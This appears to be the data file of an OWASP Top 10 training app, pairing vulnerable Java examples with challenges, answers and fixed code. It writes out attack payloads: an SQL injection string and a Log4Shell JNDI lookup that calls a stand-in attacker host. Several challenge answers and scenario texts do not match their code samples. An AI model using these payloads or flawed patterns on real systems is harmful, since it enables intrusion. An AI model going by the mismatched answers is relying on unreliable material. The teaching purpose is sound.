const vulnerabilitiesData = [
    {
        id: 'a01',
        title: 'A01:2021 - Broken Access Control',
        description: 'Broken Access Control occurs when an application does not properly enforce what users can and cannot do. Attackers exploit these flaws to gain unauthorized access to resources, modify data, or perform actions beyond their intended permissions.\n\nCommon Issues Leading to Broken Access Control:\n• Bypassing access control checks (e.g., modifying URLs, parameters, or API requests to access restricted resources).\n• Failure to enforce user roles and permissions properly.\n• Insecure Direct Object References (IDOR) where users can access unauthorized objects by manipulating request parameters.\n• Misconfigured CORS policies, allowing unauthorized domains to access sensitive data.\n• Forcing privilege escalation (e.g., changing a user\'s role in a request).',
        scenario: 'Scenario\nVulnerable Java Code (Spring Boot) - IDOR (Insecure Direct Object Reference)\nLet\'s consider a REST API where users can fetch their profile details by providing a userId as a request parameter.',
        vulnerableCode: `@RestController
@RequestMapping("/profile")
public class ProfileController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping
    public ResponseEntity<User> getUserProfile(@RequestParam Long userId) {
        // Fetch user details based on the provided userId (No access control)
        User user = userRepository.findById(userId).orElse(null);

        if (user != null) {
            return ResponseEntity.ok(user);
        } else {
            return ResponseEntity.status(HttpStatus.NOT_FOUND).build();
        }
    }
}`,
        challenge: 'Modify the request to access another user\'s profile',
        solution: '/api/user/2',
        hint: 'Try changing the user ID in the URL to access a different user\'s data without proper authorization.',
        mitigation: `@RestController
@RequestMapping("/profile")
public class ProfileController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping
    public ResponseEntity<User> getUserProfile(@AuthenticationPrincipal UserDetails userDetails) {
        // Get the logged-in user's ID
        String username = userDetails.getUsername();
        User user = userRepository.findByUsername(username);

        if (user != null) {
            return ResponseEntity.ok(user);
        } else {
            return ResponseEntity.status(HttpStatus.NOT_FOUND).build();
        }
    }
}`,
        mitigationStrategies: [
            'Implement proper authentication and session management',
            'Use role-based access control (RBAC)',
            'Apply the principle of least privilege',
            'Enforce access control checks on every request',
            'Deny access by default',
            'Log access control failures and alert administrators'
        ]
    },
    {
        id: 'a02',
        title: 'A02:2021 - Cryptographic Failures',
        description: 'Cryptographic Failures (previously known as "Sensitive Data Exposure" in OWASP Top 10 2017) occur when applications fail to protect sensitive data properly. This includes weak encryption, improper key management, and insecure transmission/storage of data.\n\nCommon Causes of Cryptographic Failures:\n• Not Encrypting Sensitive Data – Storing passwords, credit card details, or personal data in plaintext.\n• Using Weak or Outdated Encryption Algorithms – Example: Using MD5 or SHA-1 instead of strong hashing algorithms like bcrypt, Argon2, or PBKDF2.\n• Hardcoded or Weak Encryption Keys – Storing keys in source code or using short, predictable keys.\n• Insecure Transmission of Data – Not using TLS (HTTPS) for sensitive data transmission.\n• Improper SSL/TLS Configuration – Using expired, self-signed, or weak certificates.\n• Failure to Use Strong Random Number Generators – Using predictable values for encryption keys, session tokens, or passwords.',
        scenario: 'Scenario\nVulnerable Java Code (Spring Boot) - IDOR (Insecure Direct Object Reference)\nLet\'s consider a REST API where users can fetch their profile details by providing a userId as a request parameter.',
        vulnerableCode: `import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class WeakPasswordHashing {
    public static String hashPassword(String password) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5"); // ❌ Weak hashing algorithm
        md.update(password.getBytes());
        byte[] bytes = md.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public static void main(String[] args) throws NoSuchAlgorithmException {
        String password = "securepassword";
        System.out.println("Hashed Password: " + hashPassword(password));
    }
}`,
        challenge: 'What secure hashing algorithm should replace MD5 in this code?',
        solution: 'bcrypt',
        hint: 'Look for a modern password hashing function that automatically handles salting and has adjustable work factors.',
        mitigation: `import org.mindrot.jbcrypt.BCrypt;

public class SecurePasswordHashing {
    public static String hashPassword(String password) {
        return BCrypt.hashpw(password, BCrypt.gensalt(12)); // ✅ Secure hashing with salting
    }

    public static boolean verifyPassword(String password, String hashedPassword) {
        return BCrypt.checkpw(password, hashedPassword);
    }

    public static void main(String[] args) {
        String password = "securepassword";
        String hashedPassword = hashPassword(password);
        System.out.println("Hashed Password: " + hashedPassword);

        // Verifying password
        System.out.println("Password Match: " + verifyPassword("securepassword", hashedPassword));
    }
}`,
        mitigationStrategies: [
            'Use strong, up-to-date algorithms and protocols',
            'Apply proper key management',
            'Use salted password hashing with work factors (bcrypt, Argon2, PBKDF2)',
            'Encrypt all sensitive data at rest',
            'Use TLS for data in transit',
            'Disable caching for sensitive data'
        ]
    },
    {
        id: 'a03',
        title: 'A03:2021 - Injection',
        description: 'Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. Attackers can inject malicious code to manipulate the interpreter into executing unintended commands or accessing unauthorized data.\n\nCommon Types of Injection Attacks:\n• SQL Injection (SQLi) – Injecting malicious SQL queries to access or manipulate a database.\n• Command Injection – Injecting system commands to execute on the server.\n• LDAP Injection – Manipulating LDAP queries to bypass authentication.\n• NoSQL Injection – Attacking NoSQL databases like MongoDB with unvalidated input.\n• XPath Injection – Manipulating XML queries to extract unauthorized data.',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - SQL Injection)\nVulnerable Code: User Login Using Unvalidated SQL Query',
        vulnerableCode: `import java.sql.*;

public class VulnerableLogin {
    public static boolean authenticate(String username, String password) throws SQLException {
        Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/webapp", "root", "password");
        Statement stmt = conn.createStatement();
        
        // ❌ User input directly concatenated into the SQL query
        String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
        
        ResultSet rs = stmt.executeQuery(query);
        return rs.next(); // Returns true if user exists
    }

    public static void main(String[] args) throws SQLException {
        String username = "admin";
        String password = "' OR '1'='1"; // SQL Injection payload
        if (authenticate(username, password)) {
            System.out.println("Login successful!");
        } else {
            System.out.println("Login failed!");
        }
    }
}`,
        challenge: 'What input would you use to get all users from the database?',
        solution: "' OR '1'='1",
        hint: 'Try to create a condition that is always true, so the WHERE clause matches all rows.',
        mitigation: `import java.sql.*;

public class SecureLogin {
    public static boolean authenticate(String username, String password) throws SQLException {
        Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/webapp", "root", "password");

        // ✅ Using Prepared Statements to prevent SQL Injection
        String query = "SELECT * FROM users WHERE username = ? AND password = ?";
        PreparedStatement pstmt = conn.prepareStatement(query);
        pstmt.setString(1, username);
        pstmt.setString(2, password);

        ResultSet rs = pstmt.executeQuery();
        return rs.next(); // Returns true if user exists
    }

    public static void main(String[] args) throws SQLException {
        String username = "admin";
        String password = "' OR '1'='1"; // Attempted SQL Injection (will fail)

        if (authenticate(username, password)) {
            System.out.println("Login successful!");
        } else {
            System.out.println("Login failed!");
        }
    }
}`,
        mitigationStrategies: [
            'Use parameterized queries or prepared statements',
            'Use ORMs with parameter binding',
            'Validate and sanitize user input',
            'Escape special characters',
            'Implement the principle of least privilege for database accounts',
            'Use input validation with whitelisting'
        ]
    },
    {
        id: 'a04',
        title: 'A04:2021 - Insecure Design',
        description: 'Insecure Design refers to flaws in the application\'s architecture, logic, or security controls that make it vulnerable to attacks. Unlike misconfigurations or implementation bugs, these vulnerabilities stem from poor security design decisions during development.\n\nCommon Causes of Insecure Design:\n• Lack of Threat Modeling – No security risk assessments during development.\n• Missing or Weak Access Controls – No role-based access enforcement, allowing privilege escalation.\n• Insecure Business Logic – Workflows that can be abused (e.g., modifying order prices before checkout).\n• Failure to Enforce Security Best Practices – No rate limiting, weak authentication mechanisms, or improper session management.\n• Overly Permissive Features – Allowing unrestricted file uploads, exposing sensitive APIs, or missing encryption in critical data flows.',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - Insecure Business Logic)\nScenario: Online Banking App Lacking Transaction Authorization\nThis banking system allows users to transfer money without verifying the sender\'s ownership of the account.',
        vulnerableCode: `@RestController
@RequestMapping("/transfer")
public class MoneyTransferController {

    @Autowired
    private AccountRepository accountRepository;

    @PostMapping
    public ResponseEntity<String> transferMoney(@RequestParam Long fromAccount, 
                                                @RequestParam Long toAccount, 
                                                @RequestParam double amount) {
        // ❌ No authentication check for the 'fromAccount' owner
        Account sender = accountRepository.findById(fromAccount).orElse(null);
        Account receiver = accountRepository.findById(toAccount).orElse(null);

        if (sender == null || receiver == null || sender.getBalance() < amount) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Invalid transaction.");
        }

        sender.setBalance(sender.getBalance() - amount);
        receiver.setBalance(receiver.getBalance() + amount);
        accountRepository.save(sender);
        accountRepository.save(receiver);

        return ResponseEntity.ok("Transfer successful.");
    }
}`,
        challenge: 'What critical security checks are missing in this API?',
        solution: 'account ownership verification',
        hint: 'Think about how the API verifies that the user initiating the transfer actually owns the account they\'re transferring money from.',
        mitigation: `@RestController
@RequestMapping("/transfer")
public class SecureMoneyTransferController {

    @Autowired
    private AccountRepository accountRepository;

    @Autowired
    private AuthenticationService authService; // ✅ Added authentication check

    @PostMapping
    public ResponseEntity<String> transferMoney(@RequestParam Long fromAccount, 
                                                @RequestParam Long toAccount, 
                                                @RequestParam double amount,
                                                @AuthenticationPrincipal UserDetails userDetails) {
        Account sender = accountRepository.findById(fromAccount).orElse(null);
        Account receiver = accountRepository.findById(toAccount).orElse(null);

        if (sender == null || receiver == null || sender.getBalance() < amount) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Invalid transaction.");
        }

        // ✅ Ensure the sender owns the account before allowing transfer
        if (!sender.getOwnerUsername().equals(userDetails.getUsername())) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Unauthorized transfer.");
        }

        sender.setBalance(sender.getBalance() - amount);
        receiver.setBalance(receiver.getBalance() + amount);
        accountRepository.save(sender);
        accountRepository.save(receiver);

        return ResponseEntity.ok("Transfer successful.");
    }
}`,
        mitigationStrategies: [
            'Apply threat modeling in the design phase',
            'Establish secure defaults in your application',
            'Implement proper authentication and authorization',
            'Limit resource access and implement rate limiting',
            'Verify business logic flows',
            'Design with failure in mind and implement proper error handling'
        ]
    },
    {
        id: 'a05',
        title: 'A05:2021 - Security Misconfiguration',
        description: 'Security Misconfiguration occurs when an application, server, or framework is not securely configured, leaving it vulnerable to attacks. This includes default settings, exposed admin panels, overly permissive permissions, misconfigured security headers, or unnecessary services running.\n\nCommon Causes of Security Misconfiguration:\n• Default Credentials & Configurations – Leaving default usernames/passwords (e.g., admin:admin).\n• Unnecessary Features Enabled – Running unused services, unnecessary ports, or debug modes in production.\n• Misconfigured HTTP Headers – Missing security headers like Content-Security-Policy (CSP) or Strict-Transport-Security (HSTS).\n• Exposed Error Messages & Stack Traces – Revealing sensitive system details (e.g., database errors, file paths).\n• Overly Permissive Cloud Storage Settings – Publicly exposed S3 buckets, Azure Blob Storage, or GCP Buckets.\n• Excessive Permissions – Granting users, services, or applications more privileges than necessary.',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - Misconfigured Spring Boot App)\nScenario: Exposing Sensitive Information via Stack Traces\nIn this example, an unhandled exception in a Spring Boot application leaks stack traces and database queries, which can help attackers understand the internal structure. The application only has 99 users.',
        vulnerableCode: `@RestController
@RequestMapping("/user")
public class UserController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/{id}")
    public User getUser(@PathVariable Long id) {
        // ❌ No exception handling - Stack traces may be exposed
        return userRepository.findById(id).orElseThrow(() -> new RuntimeException("User not found!"));
    }
}`,
        challenge: 'What critical header is missing from the server configuration?',
        solution: 'Content-Security-Policy',
        hint: 'Look for HTTP security headers that help prevent cross-site scripting and other code injection attacks.',
        mitigation: `@RestController
@RequestMapping("/user")
public class SecureUserController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/{id}")
    public ResponseEntity<?> getUser(@PathVariable Long id) {
        return userRepository.findById(id)
                .map(ResponseEntity::ok)
                .orElseGet(() -> ResponseEntity.status(HttpStatus.NOT_FOUND)
                        .body("User not found"));
    }

    @ExceptionHandler(Exception.class)
    public ResponseEntity<?> handleException(Exception e) {
        // ✅ Generic error message to prevent information disclosure
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body("An unexpected error occurred.");
    }
}`,
        mitigationStrategies: [
            'Remove default accounts and passwords',
            'Implement a proper security hardening process',
            'Disable unnecessary features and frameworks',
            'Update and patch systems regularly',
            'Use security headers and implement proper CORS policy',
            'Use configuration management with security validation'
        ]
    },
    {
        id: 'a06',
        title: 'A06:2021 - Vulnerable and Outdated Components',
        description: 'This vulnerability occurs when an application uses outdated, unsupported, or vulnerable third-party components, such as libraries, frameworks, dependencies, or software packages. Attackers exploit known security flaws in these components to gain unauthorized access, execute malicious code, or disrupt services.\n\nCommon Causes of Vulnerable and Outdated Components:\n• Using Old or Unsupported Libraries – E.g., running an outdated version of Log4j vulnerable to Log4Shell (CVE-2021-44228).\n• Not Updating Dependencies – Developers fail to patch known vulnerabilities in third-party packages.\n• Using End-of-Life (EOL) Software – Older frameworks no longer receive security updates.\n• Failure to Monitor for Vulnerabilities – No Software Composition Analysis (SCA) or security updates applied.\n• Including Unverified or Unsafe Dependencies – Using random GitHub or Stack Overflow code without security reviews.',
        scenario: 'Example of a Vulnerable Code (Java - Outdated Log4j Usage)\nScenario: Java Application Using a Vulnerable Log4j Version\nThis Java app uses Log4j 2.14.1, which is vulnerable to Remote Code Execution (RCE) via Log4Shell (CVE-2021-44228).',
        vulnerableCode: `import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jVulnerableApp {
    private static final Logger logger = LogManager.getLogger(Log4jVulnerableApp.class);

    public static void main(String[] args) {
        String userInput = "\${jndi:ldap://malicious-attacker.com/exploit}"; // ❌ Attack payload
        logger.error("User input: " + userInput); // ❌ Logs unvalidated input
    }
}`,
        challenge: 'What input pattern could an attacker use to exploit this Log4j vulnerability?',
        solution: '$' + '{jndi:ldap://attacker.com/exploit}',
        hint: 'Look for a pattern that allows JNDI lookups to external servers. This vulnerability could allow attackers to execute arbitrary code remotely.',
        mitigation: `import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.message.StringFormatterMessageFactory;

public class SecureLog4jApp {
    private static final Logger logger = LogManager.getLogger(SecureLog4jApp.class, new StringFormatterMessageFactory());

    public static void main(String[] args) {
        String userInput = "\${jndi:ldap://malicious-attacker.com/exploit}"; 

        // ✅ Secure logging: Prevents Log4Shell by not resolving expressions
        logger.error("User input: {}", userInput); 
    }
}`,
        mitigationStrategies: [
            '✅ Upgraded Log4j to 2.17.1 – Patches Log4Shell vulnerability.',
            '✅ Uses Safe Logging ({} Placeholder) – Prevents JNDI injection.',
            'Use dependency management tools like Maven, Gradle, npm to track outdated packages',
            'Apply security patches promptly',
            'Implement automated security scanning with SCA tools',
            'Avoid using end-of-life software and frameworks',
            'Use minimalist containers to reduce attack surface'
        ]
    },
    {
        id: 'a07',
        title: 'A07:2021 - Identification and Authentication Failures',
        description: 'This category refers to weak authentication mechanisms that allow attackers to compromise user accounts, steal credentials, or bypass authentication controls. It includes broken authentication, weak password policies, missing multi-factor authentication (MFA), and session mismanagement.\n\nCommon Causes of Identification and Authentication Failures:\n• Weak or Default Passwords – Allowing users to set easily guessable passwords like 123456 or password.\n• No Multi-Factor Authentication (MFA) – Making accounts vulnerable to credential stuffing and phishing attacks.\n• Session Fixation / Hijacking – Attackers steal or reuse session IDs to impersonate users.\n• Insecure Password Storage – Storing passwords in plaintext or using weak hashing (e.g., MD5, SHA-1).\n• Brute Force & Credential Stuffing Attacks – Lack of rate-limiting on login endpoints allows automated attacks.',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - Weak Authentication)\nScenario: Login API Without Rate Limiting or MFA\nThis Spring Boot authentication system allows unlimited login attempts and uses weak password storage (MD5), making it vulnerable to brute force attacks and credential stuffing.',
        vulnerableCode: `@RestController
@RequestMapping("/auth")
public class AuthController {

    @Autowired
    private UserRepository userRepository;

    @PostMapping("/login")
    public ResponseEntity<String> login(@RequestParam String username, @RequestParam String password) {
        User user = userRepository.findByUsername(username);

        if (user != null && user.getPassword().equals(hashPassword(password))) { // ❌ Weak authentication check
            String token = UUID.randomUUID().toString(); // ❌ No session expiration or JWT
            return ResponseEntity.ok("Login successful. Token: " + token);
        }
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Invalid credentials.");
    }

    private String hashPassword(String password) {
        // ❌ MD5 is weak and vulnerable to collisions
        return DigestUtils.md5Hex(password);
    }
}`,
        challenge: 'What is the main authentication flaw in the error message?',
        solution: 'username enumeration',
        hint: 'Look at the error message returned when a username doesn\'t exist versus when a password is incorrect. Do they provide different information to an attacker?',
        mitigation: `@RestController
@RequestMapping("/auth")
public class SecureAuthController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private JwtUtil jwtUtil;

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
        try {
            authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(username, password));

            User user = userRepository.findByUsername(username);
            String token = jwtUtil.generateToken(user.getUsername()); // ✅ Secure JWT token with expiration

            return ResponseEntity.ok(Collections.singletonMap("token", token));
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Invalid credentials.");
        }
    }
}`,
        mitigationStrategies: [
            'Implement multi-factor authentication',
            'Avoid default or weak passwords',
            'Implement rate limiting and account lockout mechanisms',
            'Use secure password recovery mechanisms',
            'Store passwords using strong adaptive hashing functions',
            'Use session identifiers that are secure and invalidated after logout',
            'Use generic error messages that don\'t reveal user existence',
            'Validate all authentication inputs against injection attacks'
        ]
    },
    {
        id: 'a08',
        title: 'A08:2021 - Software and Data Integrity Failures',
        description: 'This category focuses on integrity issues related to untrusted software updates, insecure CI/CD pipelines, and data tampering. Attackers exploit these flaws to inject malicious code, manipulate sensitive data, or distribute compromised software updates.\n\nCommon Causes of Software and Data Integrity Failures:\n• Untrusted Software Updates – Downloading and executing updates without verifying authenticity (e.g., lack of digital signatures).\n• Insecure CI/CD Pipelines – Weak security in build/deployment processes allows attackers to inject malicious code.\n• Tampering with Critical Data – Unprotected configuration files, API payloads, or session tokens can be modified.\n• Dependency Confusion Attacks – Attackers trick applications into downloading malicious versions of internal packages.\n• Deserialization of Untrusted Data – Allowing arbitrary object deserialization, leading to Remote Code Execution (RCE).',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - Unverified Software Update)\nScenario: Downloading and Executing an Untrusted Update\nThis Java application downloads an update from an external URL and executes it without verification, allowing attackers to inject malicious code.',
        vulnerableCode: `import java.io.*;
import java.net.*;

public class AutoUpdater {
    public static void main(String[] args) throws Exception {
        String updateUrl = "http://example.com/updates/latest.jar"; // ❌ Untrusted source
        String savePath = "latest.jar";

        // ❌ Downloading without verification
        try (BufferedInputStream in = new BufferedInputStream(new URL(updateUrl).openStream());
             FileOutputStream fileOutputStream = new FileOutputStream(savePath)) {

            byte dataBuffer[] = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                fileOutputStream.write(dataBuffer, 0, bytesRead);
            }
        }

        // ❌ Running unverified code
        Runtime.getRuntime().exec("java -jar " + savePath);
    }
}`,
        challenge: 'What JavaScript library should be used to safely parse JSON with a schema?',
        solution: 'ajv',
        hint: 'Look for a popular JSON schema validator for JavaScript/Node.js that allows you to define a schema and validate data against it.',
        mitigation: `import java.io.*;
import java.net.*;
import java.security.MessageDigest;
import java.util.Base64;

public class SecureAutoUpdater {
    private static final String EXPECTED_SHA256 = "c29tZVNlY3VyZVNpZ25hdHVyZQ=="; // ✅ Securely stored hash

    public static void main(String[] args) throws Exception {
        String updateUrl = "https://example.com/updates/latest.jar"; // ✅ Use HTTPS
        String savePath = "latest.jar";

        // ✅ Secure Download
        try (BufferedInputStream in = new BufferedInputStream(new URL(updateUrl).openStream());
             FileOutputStream fileOutputStream = new FileOutputStream(savePath)) {

            byte dataBuffer[] = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                fileOutputStream.write(dataBuffer, 0, bytesRead);
            }
        }

        // ✅ Verify SHA-256 hash before execution
        if (verifySHA256(savePath, EXPECTED_SHA256)) {
            Runtime.getRuntime().exec("java -jar " + savePath); // ✅ Safe execution
        } else {
            System.out.println("Update verification failed! Aborting execution.");
        }
    }

    private static boolean verifySHA256(String filePath, String expectedHash) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        try (FileInputStream fis = new FileInputStream(filePath);
             BufferedInputStream bis = new BufferedInputStream(fis)) {

            byte[] byteArray = new byte[1024];
            int bytesRead;
            while ((bytesRead = bis.read(byteArray, 0, 1024)) != -1) {
                digest.update(byteArray, 0, bytesRead);
            }
        }

        String fileHash = Base64.getEncoder().encodeToString(digest.digest());
        return fileHash.equals(expectedHash);
    }
}`,
        mitigationStrategies: [
            'Use digital signatures to verify software or data authenticity',
            'Use dependency management tools that check package integrity',
            'Ensure libraries and dependencies are from trusted repositories',
            'Implement a software supply chain security program',
            'Use automated tools to verify the integrity of dependencies',
            'Ensure CI/CD pipelines use proper signing and verification',
            'Validate serialized data from untrusted sources before use',
            'Use integrity checks for critical system functions'
        ]
    },
    {
        id: 'a09',
        title: 'A09:2021 - Security Logging and Monitoring Failures',
        description: 'This category focuses on insufficient logging, missing monitoring mechanisms, and ineffective alerting, which allow attackers to operate undetected. Without proper logging and monitoring, organizations fail to detect security breaches, prevent data theft, or investigate incidents properly.\n\nCommon Causes of Security Logging & Monitoring Failures:\n• No or Insufficient Logging – Missing logs for authentication, API calls, database access, etc.\n• Logs Not Protected – Attackers can modify or delete logs to cover their tracks.\n• No Real-Time Monitoring & Alerting – Delayed detection of attacks leads to prolonged breaches.\n• Logging Sensitive Data – Exposing passwords, API keys, or PII (Personally Identifiable Information) in logs.\n• Failure to Detect Anomalous Behavior – No correlation of logs to detect suspicious activities.',
        scenario: 'Scenario\nExample of a Vulnerable Code (Java - Insufficient Logging in a Login System)\nScenario: Failed Login Attempts Are Not Logged\nThis Java-based authentication system fails to log failed login attempts, making it impossible to detect brute-force attacks.',
        vulnerableCode: `@RestController
@RequestMapping("/auth")
public class AuthController {

    @Autowired
    private UserRepository userRepository;

    @PostMapping("/login")
    public ResponseEntity<String> login(@RequestParam String username, @RequestParam String password) {
        User user = userRepository.findByUsername(username);

        if (user != null && user.getPassword().equals(hashPassword(password))) {
            return ResponseEntity.ok("Login successful.");
        }

        // ❌ No logging for failed login attempts
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Invalid credentials.");
    }

    private String hashPassword(String password) {
        return DigestUtils.sha256Hex(password);
    }
}`,
        challenge: 'What information should a security log record for login attempts?',
        solution: 'timestamp, username, IP address, success/failure',
        hint: 'Think about what information would be useful for identifying suspicious login patterns and investigating security incidents.',
        mitigation: `import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@RestController
@RequestMapping("/auth")
public class SecureAuthController {

    private static final Logger logger = LoggerFactory.getLogger(SecureAuthController.class);

    @Autowired
    private UserRepository userRepository;

    @PostMapping("/login")
    public ResponseEntity<String> login(@RequestParam String username, @RequestParam String password, HttpServletRequest request) {
        User user = userRepository.findByUsername(username);

        if (user != null && user.getPassword().equals(hashPassword(password))) {
            logger.info("Successful login for user: {}", username);
            return ResponseEntity.ok("Login successful.");
        }

        // ✅ Log failed login attempts with IP address
        String clientIp = request.getRemoteAddr();
        logger.warn("Failed login attempt for user: {} from IP: {}", username, clientIp);

        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Invalid credentials.");
    }

    private String hashPassword(String password) {
        return DigestUtils.sha256Hex(password);
    }
}`,
        mitigationStrategies: [
            'Implement logging for all authentication, access control, and server-side input validation failures',
            'Ensure logs are in a format suitable for consumption by centralized logging solutions',
            'Establish effective monitoring and alerting',
            'Create an incident response plan',
            'Use a SIEM (Security Information and Event Management) system',
            'Log with enough context to identify suspicious activities',
            'Protect log integrity from tampering',
            'Implement automatic alerts for suspicious activities'
        ]
    },
    {
        id: 'a10',
        title: 'A10:2021 - Server-Side Request Forgery (SSRF)',
        description: 'Server-Side Request Forgery (SSRF) occurs when an attacker manipulates a server into making unauthorized requests to internal or external resources. This can lead to:\n\n• Data exfiltration (e.g., accessing sensitive internal services like AWS metadata).\n• Bypassing firewalls to scan or interact with internal systems.\n• Remote code execution (RCE) in severe cases.\n\nCommon Causes of SSRF Vulnerabilities:\n• Unvalidated User Input in URL Requests – Allowing external input to control request destinations.\n• Lack of Allowlist Validation – No restriction on internal or sensitive resources.\n• Insecure Handling of URL Redirections – Redirects to unintended destinations.\n• Misconfigured Cloud Metadata Access – Exposing cloud credentials via services like AWS Instance Metadata.\n• Blind SSRF in APIs – Server fetches attacker-controlled URLs without showing responses to users.',
        scenario: 'Scenario\nA bank\'s web application provides an "Account Statement Fetcher" feature, allowing users to retrieve their account statements from trusted third-party financial institutions. The backend fetches the statement by taking a user-supplied URL and sending a request to download the statement in PDF format.',
        vulnerableCode: `import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.net.*;

@RestController
@RequestMapping("/bank")
public class StatementFetcherController {

    @GetMapping("/fetch-statement")
    public String fetchStatement(@RequestParam String url) throws IOException {
        URL statementUrl = new URL(url); // ❌ No validation on user-supplied URL
        BufferedReader in = new BufferedReader(new InputStreamReader(statementUrl.openStream()));
        StringBuilder response = new StringBuilder();
        String inputLine;

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        return response.toString();
    }
}`,
        challenge: 'What URL could an attacker use to access internal services?',
        solution: 'http://localhost:3000',
        hint: 'Think about how an attacker could target resources that should only be accessible from within the internal network.',
        mitigation: `import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.net.*;
import java.util.List;

@RestController
@RequestMapping("/bank")
public class SecureStatementFetcherController {

    private static final List<String> ALLOWED_DOMAINS = List.of("https://securebankstatements.com", "https://trustedfinancialpartner.com");

    @GetMapping("/fetch-statement")
    public String fetchStatement(@RequestParam String url) throws IOException {
        if (!isValidUrl(url)) {
            return "Invalid URL!";
        }

        URL statementUrl = new URL(url);
        BufferedReader in = new BufferedReader(new InputStreamReader(statementUrl.openStream()));
        StringBuilder response = new StringBuilder();
        String inputLine;

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        return response.toString();
    }

    private boolean isValidUrl(String url) {
        try {
            URL parsedUrl = new URL(url);
            String host = parsedUrl.getHost();

            for (String allowed : ALLOWED_DOMAINS) {
                if (host.equals(new URL(allowed).getHost())) {
                    return true; // ✅ Allow only trusted banking domains
                }
            }
        } catch (MalformedURLException e) {
            return false;
        }
        return false;
    }
}`,
        mitigationStrategies: [
            'Implement a whitelist of allowed domains and protocols',
            'Block requests to private IP ranges and localhost',
            'Use network segmentation and firewall rules',
            'Validate and sanitize all client-supplied input data',
            'Use URL parsing and validation libraries',
            'Don\'t send raw responses to clients',
            'Disable HTTP redirects',
            'Use a web application firewall (WAF)'
        ]
    }
];